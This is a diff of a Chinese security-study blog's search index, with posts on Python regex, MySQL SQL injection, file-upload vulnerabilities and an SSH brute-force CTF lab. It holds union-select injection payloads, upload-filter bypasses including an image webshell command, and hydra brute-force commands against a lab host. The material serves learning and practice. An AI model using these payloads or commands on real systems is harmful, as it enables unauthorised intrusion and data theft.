+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rst=re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">函数式的调用，一次性操作<span class="number">12</span></span><br><span class="line">pat=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line">rst=pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">编译后多次操作<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>regex=re.complie(pattern,flags=0)<br>
+regex也有以上六种用法</p>
+<h2 id="2-4Re库的Match对象"><a class="header-anchor" href="#2-4Re库的Match对象">¶</a>2.4Re库的Match对象</h2>
+<blockquote>
+<p>Match对象是是一次匹配的结果，包含匹配的很多信息</p>
+</blockquote>
+<p>*<strong>以下是Match对象的属性*</strong></p>
+<ul>
+<li>.string 待匹配的文本</li>
+<li>.re 匹配时使用的patter对象（正则表达式）</li>
+<li>.pos 正则表达式搜索文本的开始位置</li>
+<li>.endpos 正则表达式搜索文本的结束位置</li>
+</ul>
+<p>*<strong>以下是Match对象的方法*</strong></p>
+<ul>
+<li>.group(0) 获得匹配后的字符串</li>
+<li>.start() 匹配字符串在原始字符串的开始位置</li>
+<li>.end() 匹配字符串在原始字符串的结束位置</li>
+<li>.span() 返回(.start(), .end())</li>
+</ul>
+<h2 id="2-5Re库的贪婪匹配和最小匹配"><a class="header-anchor" href="#2-5Re库的贪婪匹配和最小匹配">¶</a>2.5Re库的贪婪匹配和最小匹配</h2>
+<p>当正则表达式可以匹配长短不同的多项时，返回哪一个呢？Re库默认采用贪婪匹配，即返回匹配最长的子串</p>
+<p>*<strong>最小匹配*</strong></p>
+<ul>
+<li>*? 前一个字符0次或无限次扩展，最小匹配</li>
+<li>+? 前一个字符1次或无限次扩展，最小匹配</li>
+<li>?? 前一个字符0次或1次扩展，最小匹配</li>
+<li>{m,n}? 扩展前一个字符m至n次（含n），最小匹配</li>
+</ul>
+<p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入之mysql学习基础(一)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
+    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
+<a id="more"></a>
+<h1>MySQL的数据库结构</h1>
+<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
+<h1>注入的产生</h1>
+<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
+<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
+<h1>MySQL5注入的一般流程</h1>
+<p>获取字段数-查库名-查表名-查列名-查数据</p>
+<p>获取字段数：order by 临界值<br>
+获取库名：database()<br>
+表名和列名没有内置函数 怎么查？</p>
+<p>union语句：将不同表的两个列查询的数据去重拼接<br>
+union all ：不去重</p>
+<p>获取MySQL版本：version()<br>
+MySQL5.0以下版本只能和access数据库一样猜解<br>
+而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
+information_schema.tables 记录表名信息<br>
+information_schema.columns 记录列名信息<br>
+TABLE_SCHEMA 数据库字段<br>
+table_name 表名<br>
+column_name 列名<br>
+查表名：<br>
+SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
+查列名：<br>
+SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
+查数据：<br>
+select 列名 from 库名.表名</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入之mysql学习基础(二)</title>
+    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
+    <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
+<a id="more"></a>
+<h1>MySQL注入</h1>
+<h2 id="基本介绍"><a class="header-anchor" href="#基本介绍">¶</a>基本介绍</h2>
+<h3 id="字符型"><a class="header-anchor" href="#字符型">¶</a>字符型</h3>
+<p>有这几种常见情况,闭合SQL语句，再插入我们需要的sql语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id= &#x27;$id&#x27;&quot;;</span><br><span class="line">闭合前面的单引号把后面的单引号注释掉跟上<span class="keyword">sql</span>语句</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27; ))</span><br><span class="line">闭合单引号，闭合两个括号把后面的都注释掉跟上sql语句</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>)&quot;;</span><br><span class="line">闭合单引号，闭合括号把后面的都注释掉跟上sql语句</span><br><span class="line">$id =&#x27;&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;&#x27;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">闭合前面的双引号再注释后面的双引号</span><br><span class="line">$id = &#x27;(&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;)&#x27;;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
+<h3 id="数字型"><a class="header-anchor" href="#数字型">¶</a>数字型</h3>
+<p>字符型和数字型的区别在于接受的参数id的类型和数据库中id的字段类型<br>
+其实和字符型的注入方式是一样的，不必过度纠结于两者具体的区别</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id&quot;;</span><br></pre></td></tr></table></figure>
+<h3 id="搜索型"><a class="header-anchor" href="#搜索型">¶</a>搜索型</h3>
+<p>就是post型的提交方式<br>
+<a href="https://imgchr.com/i/sAayjJ"><img src="https://s3.ax1x.com/2021/01/05/sAayjJ.png" alt="sAayjJ.png"></a></p>
+<h3 id="Cookie注入"><a class="header-anchor" href="#Cookie注入">¶</a>Cookie注入</h3>
+<p><a href="https://imgchr.com/i/sAabDA"><img src="https://s3.ax1x.com/2021/01/05/sAabDA.png" alt="sAabDA.png"></a></p>
+<h3 id="HTTP头注入"><a class="header-anchor" href="#HTTP头注入">¶</a>HTTP头注入</h3>
+<p>X-Forwarded-For<br>
+X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。类似的还有如下几种<br>
+X-Originating-IP: 127.0.0.1<br>
+X-Forwarded-For: 127.0.0.1<br>
+X-Remote-IP: 127.0.0.1<br>
+X-Remote-Addr: 127.0.0.1<br>
+Client-IP: 127.0.0.1<br>
+User-agent<br>
+用户代理(user agent)是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息(如:购物车)。在这种情况下，我们就有必要研究下user-agent头存在的问题了。<br>
+Referer<br>
+Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。<br>
+<a href="https://imgchr.com/i/sAaj4f"><img src="https://s3.ax1x.com/2021/01/05/sAaj4f.png" alt="sAaj4f.png"></a></p>
+<h2 id="具体实例"><a class="header-anchor" href="#具体实例">¶</a>具体实例</h2>
+<h3 id="数字型注入"><a class="header-anchor" href="#数字型注入">¶</a>数字型注入</h3>
+<h4 id="一般类型"><a class="header-anchor" href="#一般类型">¶</a>一般类型</h4>
+<p>因为不知道接收的id是1或者是&quot;1&quot;的形式我们先当成数字型注入<br>
+如何判断：'url?id=1+1’如果成功返回数据则为数字型注入<code>+</code>=<code>%2b</code><br>
+<a href="https://imgchr.com/i/sAdibn"><img src="https://s3.ax1x.com/2021/01/05/sAdibn.png" alt="sAdibn.png"></a><br>
+首先查字段<br>
+url?id = 1 order by 3 不报错<br>
+url?id = 1 order by 4 报错<br>
+所以有三个字段<br>
+接下来使用联合查询:<code>url?id = 1 union select 1,2,3</code><br>
+<a href="https://imgchr.com/i/sAdE5V"><img src="https://s3.ax1x.com/2021/01/05/sAdE5V.png" alt="sAdE5V.png"></a><br>
+查当前数据库名，版本，用户<br>
+<code>url?id = 1 union select database(),version(),user()</code><br>
+<a href="https://imgchr.com/i/sAdZCT"><img src="https://s3.ax1x.com/2021/01/05/sAdZCT.png" alt="sAdZCT.png"></a><br>
+查询有什么表<br>
+<code>url?id = 1 union select 1,2,table_name from infomation_schema.tables where table_schema = database()</code><br>
+<a href="https://imgchr.com/i/sAdm2F"><img src="https://s3.ax1x.com/2021/01/05/sAdm2F.png" alt="sAdm2F.png"></a><br>
+查询列名：<br>
+<code>url?id = 1 union select 1,2,column_name from infomation_schema.columns where table_table = 'users'</code><br>
+<a href="https://imgchr.com/i/sAd1V1"><img src="https://s3.ax1x.com/2021/01/05/sAd1V1.png" alt="sAd1V1.png"></a><br>
+查询数据：<br>
+<code>url?id = 1 union select id,username,password from users</code><br>
+<a href="https://imgchr.com/i/sAdt2D"><img src="https://s3.ax1x.com/2021/01/05/sAdt2D.png" alt="sAdt2D.png"></a></p>
+<h4 id="被单引号包裹起来的"><a class="header-anchor" href="#被单引号包裹起来的">¶</a>被单引号包裹起来的</h4>
+<p><a href="https://imgchr.com/i/sAdgxg"><img src="https://s3.ax1x.com/2021/01/05/sAdgxg.png" alt="sAdgxg.png"></a><br>
+<a href="https://imgchr.com/i/sAd5aq"><img src="https://s3.ax1x.com/2021/01/05/sAd5aq.png" alt="sAd5aq.png"></a><br>
+在之后我们拼接and 1=1 and 1= 2,发现没有报错<br>
+<a href="https://imgchr.com/i/sAdTiV"><img src="https://s3.ax1x.com/2021/01/05/sAdTiV.png" alt="sAdTiV.png"></a><br>
+之后加上<code>id = 1'</code>单引号后报错，不正常说明sql语句可控<br>
+在Mysql中<code>--+</code>代表注释此时<code>id = 1'--+</code>成功执行<br>
+<a href="https://imgchr.com/i/sAdXL9"><img src="https://s3.ax1x.com/2021/01/05/sAdXL9.png" alt="sAdXL9.png"></a><br>
+之后插上<code>id = 1 and 1=2'-- +</code>不正常，即可食用之后类似上面一般类型</p>
+<h4 id="双引号加小括号包裹"><a class="header-anchor" href="#双引号加小括号包裹">¶</a>双引号加小括号包裹</h4>
+<p><a href="https://imgchr.com/i/sAdzIx"><img src="https://s3.ax1x.com/2021/01/05/sAdzIx.png" alt="sAdzIx.png"></a><br>
+首先查看<code>id = 1</code><br>
+<a href="https://imgchr.com/i/sAwPzD"><img src="https://s3.ax1x.com/2021/01/05/sAwPzD.png" alt="sAwPzD.png"></a><br>
+类似上面<code>?id = 1') and 1 = 2-- +</code>发现1=1和1=2成功执行</p>
+<h4 id="两个括号"><a class="header-anchor" href="#两个括号">¶</a>两个括号</h4>
+<p><img src="https://img-blog.csdnimg.cn/20200618112825139.png" alt="在这里插入图片描述"><br>
+<a href="https://imgchr.com/i/sAwksH"><img src="https://s3.ax1x.com/2021/01/05/sAwksH.png" alt="sAwksH.png"></a><br>
+采用<code>? id = 1')) union select 1,2,3 -- +</code></p>
+<h3 id="字符型注入"><a class="header-anchor" href="#字符型注入">¶</a>字符型注入</h3>
+<p>如果在url后拼接<code>?id=1 and 1=1</code>or<code>and 1=2</code>分别正确错误则说明为字符型注入<br>
+注入方式和数字型类似</p>
+<h3 id="搜索型注入"><a class="header-anchor" href="#搜索型注入">¶</a>搜索型注入</h3>
+<p><a href="https://imgchr.com/i/sAwALd"><img src="https://s3.ax1x.com/2021/01/05/sAwALd.png" alt="sAwALd.png"></a><br>
+%代表%前面可以有字符后面也可以有<br>
+配合HackBar食用<br>
+<a href="https://imgchr.com/i/sAwZdI"><img src="https://s3.ax1x.com/2021/01/05/sAwZdI.png" alt="sAwZdI.png"></a><br>
+post数据<code>name = a' union select 1,2,3 -- +</code></p>
+<h3 id="Cookie注入-v2"><a class="header-anchor" href="#Cookie注入-v2">¶</a>Cookie注入</h3>
+<p><a href="https://imgchr.com/i/sAwnFP"><img src="https://s3.ax1x.com/2021/01/05/sAwnFP.png" alt="sAwnFP.png"></a><br>
+配合Burp使用<br>
+<a href="https://imgchr.com/i/sAw1yQ"><img src="https://s3.ax1x.com/2021/01/05/sAw1yQ.png" alt="sAw1yQ.png"></a><br>
+改为<code>Cookie: uid = 1 union select 1,2,3</code></p>
+<h3 id="HTTP头注入-v2"><a class="header-anchor" href="#HTTP头注入-v2">¶</a>HTTP头注入</h3>
+<p><a href="https://imgchr.com/i/sAwYoq"><img src="https://s3.ax1x.com/2021/01/05/sAwYoq.png" alt="sAwYoq.png"></a><br>
+<a href="https://imgchr.com/i/sAwfSO"><img src="https://s3.ax1x.com/2021/01/05/sAwfSO.png" alt="sAwfSO.png"></a></p>
+<p>配合Burp食用<br>
+<a href="https://imgchr.com/i/sAwbkt"><img src="https://s3.ax1x.com/2021/01/05/sAwbkt.png" alt="sAwbkt.png"></a><br>
+添加XFF头<br>
+<a href="https://imgchr.com/i/sA0FhV"><img src="https://s3.ax1x.com/2021/01/05/sA0FhV.png" alt="sA0FhV.png"></a><br>
+完美成功!!!<br>
+<code>127.0.0.1' order by 4-- +</code>成功，配合联合查询即可！！！<br>
+<a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
+看图<br>
+<a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
     <title>sql注入常见注释及绕过</title>
     <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
@@ -2075,64 +1929,80 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
-    <title>ssh弱口令爆破远程登录渗透过程</title>
-    <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
+    <title>文件上传漏洞</title>
+    <url>/2020/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>文件上传也是很常见的一种漏洞</p>
 <a id="more"></a>
-<p><strong>声明:</strong></p>
-<p><strong>实验环境由合天网安实验室和蚁景网安提供</strong></p>
-<p><strong>服务器为私人服务器</strong></p>
-<h2 id="题目展示"><a class="header-anchor" href="#题目展示">¶</a>题目展示</h2>
-<p><strong>题目:强行突破</strong></p>
-<ul>
-<li>目标：139.155.49.43</li>
-<li>port：2222</li>
-<li>提示：<a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></li>
-<li>要求：获取/root/flag.txt内容进行提交</li>
-</ul>
-<p><strong>渗透核心是信息搜所以集先进行信息搜集</strong></p>
-<h2 id="1-nmap扫描"><a class="header-anchor" href="#1-nmap扫描">¶</a>1.nmap扫描</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A -p- 139.155.49.43</span><br></pre></td></tr></table></figure>
-<p><a href="https://blog.csdn.net/haha13l4/article/details/89737637">nmap常用命令</a></p>
-<p>简单介绍以下</p>
-<ul>
-<li>-sT  Tcp连接</li>
-<li>-T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)   -T4第五个等级</li>
-<li>-A 综合扫描</li>
-</ul>
-<p>nmap扫描完发现能利用的端口只有ssh了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7e0b2620fac1036194909b0fb99187b4.png" alt="image-20201219193044690.png"></p>
-<h2 id="2-爬取ssh密码字典再利用hydra爆破"><a class="header-anchor" href="#2-爬取ssh密码字典再利用hydra爆破">¶</a>2.爬取ssh密码字典再利用hydra爆破</h2>
-<p><a href="https://bugku.com/mima/">密码字典生成器</a></p>
-<p>可以根据一些信息定制一些弱口令</p>
-<p>下面是两个fuzz字典</p>
-<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
-<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
-<p><strong>我们这里使用的是 Cewl 进行网站爬取字典,因为题目中提示了 <a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></strong></p>
-<p><strong>然后使用hydra进行爆破</strong></p>
-<p><a href="https://blog.csdn.net/systemino/article/details/90114610">cewl使用指南</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -d 2 -m 5 -w word.txt https:&#x2F;&#x2F;www.hetianlab.com </span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b3489b25749a0ff3dae640ba89926425.png" alt="Snipaste_2020-12-19_20-05-47.png"></p>
-<p>打开字典 发现有很多但是有很多中文,所以使用正则删掉爬取到的中文</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/2a3a20bb0fb598a37a885f3c3a630e22.png" alt="Snipaste_2020-12-19_20-06-50.png"></p>
-<p>双字节匹配<code>[^\x00-\xff]</code> 删除中文</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0cd012a9b95fd759df2a684344daa1bc.png" alt="Snipaste_2020-12-19_20-10-24.png"></p>
-<p>然后再   <code>\n</code> 匹配所有换行符并且删除就得到了正常的字典</p>
-<p>接下来使用hydra进行ssh爆破</p>
-<p><a href="https://www.cnblogs.com/xyz315/p/13072731.html">hydra常用命令</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P word.txt 139.155.49.43 -s 2222 -f ssh</span><br></pre></td></tr></table></figure>
-<p>这里 用户用的是root，不知道用户名的可以使用 -L选择常见用户名的字典进行爆破</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/d7cb91b1505635eeda98ccf7b263eb00.png" alt="Snipaste_2020-12-19_20-26-20.png"></p>
-<p>可以看到我们成功爆出了它服务器得到密码</p>
-<h2 id="3-远程登录获取flag"><a class="header-anchor" href="#3-远程登录获取flag">¶</a>3.远程登录获取flag</h2>
-<p>知道用户名和密码了，进行远程登录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@139.155.49.43 -p 2222</span><br></pre></td></tr></table></figure>
-<p>可以看到我们成功获得了flag</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/948663faf0d2c739bf0e27b9a1d861cb.png" alt="Snipaste_2020-12-19_20-32-36.png"></p>
+<h2 id="一、概述"><a class="header-anchor" href="#一、概述">¶</a>一、概述</h2>
+<h3 id="1-漏洞简介"><a class="header-anchor" href="#1-漏洞简介">¶</a>1.漏洞简介</h3>
+<p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
+<h3 id="2-漏洞原理"><a class="header-anchor" href="#2-漏洞原理">¶</a>2.漏洞原理</h3>
+<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
+<h3 id="3-漏洞危害"><a class="header-anchor" href="#3-漏洞危害">¶</a>3.漏洞危害</h3>
+<p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p>
+<h2 id="二、常见校验上传文件的方法"><a class="header-anchor" href="#二、常见校验上传文件的方法">¶</a>二、常见校验上传文件的方法</h2>
+<h3 id="客户端校验"><a class="header-anchor" href="#客户端校验">¶</a>客户端校验</h3>
+<ol>
+<li>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</li>
+<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
+</ol>
+<p><strong>绕过方法:</strong></p>
+<ol>
+<li>禁用JS</li>
+<li>bp抓包修改后缀</li>
+</ol>
+<h3 id="服务端校验"><a class="header-anchor" href="#服务端校验">¶</a>服务端校验</h3>
+<h4 id="1-MIME类型检测"><a class="header-anchor" href="#1-MIME类型检测">¶</a>1.MIME类型检测</h4>
+<p>MIME类型是什么？</p>
+<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>
+在HTTP中，MIME类型被定义在Content-Type header中。</p>
+<p>常见的MIME类型：</p>
+<p>mine类型是描述消息内容类型的因特网标准</p>
+<p>常见的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;html （HTML文档）</span><br><span class="line">image&#x2F;gif （gif图像）</span><br><span class="line">text&#x2F;plain（纯文本）</span><br><span class="line">image&#x2F;png （png图像）</span><br><span class="line">application&#x2F;xml（xml）</span><br><span class="line">application&#x2F;msword （word文档）</span><br></pre></td></tr></table></figure>
+<p><strong>绕过方法：</strong></p>
+<p>通过burpsuite来修改文件的类型(Content-Type)进行过滤即可</p>
+<h4 id="2-文件内容头检测"><a class="header-anchor" href="#2-文件内容头检测">¶</a>2.文件内容头检测</h4>
+<p>通过检测文件头内容判断上传文件的合法性</p>
+<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png" alt="img"></a></p>
+<p><strong>绕过方法：</strong></p>
+<p>在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件)</p>
+<h4 id="3-黑名单与白名单"><a class="header-anchor" href="#3-黑名单与白名单">¶</a>3.黑名单与白名单</h4>
+<p>通过判断后缀名来确定上传文件的合法性</p>
+<p><strong>黑名单绕过方法：</strong></p>
+<ol>
+<li>
+<p>大小写绕过，例如Php、PhP</p>
+</li>
+<li>
+<p>利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps</p>
+</li>
+<li>
+<p>配合解析利用方法，将上传的文件当作php代码执行</p>
+</li>
+<li>
+<p>使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)</p>
+<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png" alt="img"></a></p>
+</li>
+<li>
+<p>超长文件名截断上传(windows 258byte | linux 4096byte)</p>
+</li>
+</ol>
+<p><strong>白名单</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只允许上传指定后缀的文件，我们可以利用操作系统的特性来绕过。</span><br><span class="line">例如：上传文件名phpinfo.php(空格)</span><br><span class="line">                phpinfo.php(.)</span><br><span class="line">      最后生成文件时，字符会被自动去除。</span><br></pre></td></tr></table></figure>
+<p>白名单绕过方法不太好绕过，一般都是配合解析漏洞白名单</p>
+<h4 id="4-利用服务器特殊配置（Apache）"><a class="header-anchor" href="#4-利用服务器特殊配置（Apache）">¶</a>4.利用服务器特殊配置（Apache）</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在Apache中.htaccess的配置有效，且可以被上传，那可以尝试在.htaccess中写入：</span><br><span class="line">   &lt;FilesMatch &quot;phpinfo.jpg&quot;&gt;</span><br><span class="line">   SetHandler application&#x2F;x-httpd-php</span><br><span class="line">   &lt;&#x2F;FilesMatch&gt;</span><br><span class="line">   还可以</span><br><span class="line">   AddType application&#x2F;x-httpd-php .ppp</span><br><span class="line">   这样 ppp后缀文件就会转换为php</span><br><span class="line">phpinfo.jpg即可以php脚本解析</span><br></pre></td></tr></table></figure>
+<h4 id="5-图片马"><a class="header-anchor" href="#5-图片马">¶</a>5.图片马</h4>
+<p>将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行</p>
+<p>当一句话被执行时，浏览器访问时看不到一句话代码</p>
+<p><strong>制作</strong><br>
+在cmd中输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b+a.php shell.jpg</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
-        <category>ssh弱口令爆破</category>
+        <category>web技术学习</category>
+        <category>文件上传</category>
       </categories>
   </entry>
   <entry>
@@ -2219,117 +2089,64 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2020/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>文件上传也是很常见的一种漏洞</p>
+    <title>ssh弱口令爆破远程登录渗透过程</title>
+    <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
 <a id="more"></a>
-<h2 id="一、概述"><a class="header-anchor" href="#一、概述">¶</a>一、概述</h2>
-<h3 id="1-漏洞简介"><a class="header-anchor" href="#1-漏洞简介">¶</a>1.漏洞简介</h3>
-<p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
-<h3 id="2-漏洞原理"><a class="header-anchor" href="#2-漏洞原理">¶</a>2.漏洞原理</h3>
-<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
-<h3 id="3-漏洞危害"><a class="header-anchor" href="#3-漏洞危害">¶</a>3.漏洞危害</h3>
-<p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p>
-<h2 id="二、常见校验上传文件的方法"><a class="header-anchor" href="#二、常见校验上传文件的方法">¶</a>二、常见校验上传文件的方法</h2>
-<h3 id="客户端校验"><a class="header-anchor" href="#客户端校验">¶</a>客户端校验</h3>
-<ol>
-<li>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</li>
-<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
-</ol>
-<p><strong>绕过方法:</strong></p>
-<ol>
-<li>禁用JS</li>
-<li>bp抓包修改后缀</li>
-</ol>
-<h3 id="服务端校验"><a class="header-anchor" href="#服务端校验">¶</a>服务端校验</h3>
-<h4 id="1-MIME类型检测"><a class="header-anchor" href="#1-MIME类型检测">¶</a>1.MIME类型检测</h4>
-<p>MIME类型是什么？</p>
-<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>
-在HTTP中，MIME类型被定义在Content-Type header中。</p>
-<p>常见的MIME类型：</p>
-<p>mine类型是描述消息内容类型的因特网标准</p>
-<p>常见的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;html （HTML文档）</span><br><span class="line">image&#x2F;gif （gif图像）</span><br><span class="line">text&#x2F;plain（纯文本）</span><br><span class="line">image&#x2F;png （png图像）</span><br><span class="line">application&#x2F;xml（xml）</span><br><span class="line">application&#x2F;msword （word文档）</span><br></pre></td></tr></table></figure>
-<p><strong>绕过方法：</strong></p>
-<p>通过burpsuite来修改文件的类型(Content-Type)进行过滤即可</p>
